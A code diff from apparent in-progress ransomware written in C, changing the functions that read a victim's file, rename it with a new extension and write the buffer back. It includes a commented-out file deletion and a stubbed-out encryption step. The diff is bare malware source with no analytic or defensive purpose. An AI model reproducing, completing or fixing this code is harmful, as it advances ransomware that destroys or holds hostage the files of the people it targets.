@@ -48,6 +48,7 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 	unlink(filepath);
 	*/
 	/* update tmp buffer struct to use in main. */
+	/* TODO: Have an off by 1 bug here. */
 	ransom->target_file_buf->buf[bytes_read] = '\0';
 	ransom->target_file_buf->file_offset += bytes_read;
 	ransom->target_file_buf->bytes_read = bytes_read;
@@ -77,23 +78,23 @@ char *write_file(char *buffer, ransom_t *ransom)
 
 	filepath = ransom->target_file_buf->filepath;
 	filepath_len = my_strlen(filepath);
+	/* Might need for long filepaths? linux is 4096 builtin -- the size of the buffer */
 	if(filepath_len > BIGBUF)
-	{
 		filepath = recalloc(filepath, BIGBUF, BIGBUF + BUFSIZE);
-	}
-	else
-	{
-		new_ext_len = my_strlen(new_ext);
-		buf_size = ransom->target_file_buf->bytes_read;
+	new_ext_len = my_strlen(new_ext);
+	buf_size = ransom->target_file_buf->bytes_read;
+
+	if (find_substr_end(filepath, new_ext) == 0)
 		my_strncat(filepath, new_ext, filepath_len, new_ext_len);
-	}
+
 	fd = fopen(filepath, "ab+");
+	fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
 /* TODO: base64encode function causes massive memory leaks */
 	/*
 	encrypt_buf = base64encode((const void *)buffer, buf_size + 1);
 	*/
 	encrypt_buf = buffer;
-	if ((bytes_written = fwrite(encrypt_buf, buf_size + 1, sizeof(char), fd)) < 1)
+	if ((bytes_written = fwrite(encrypt_buf, buf_size, sizeof(char), fd)) < 1)
 		fprintf(stderr, "No bytes written\n");
 	/*
 	free(encrypt_buf);
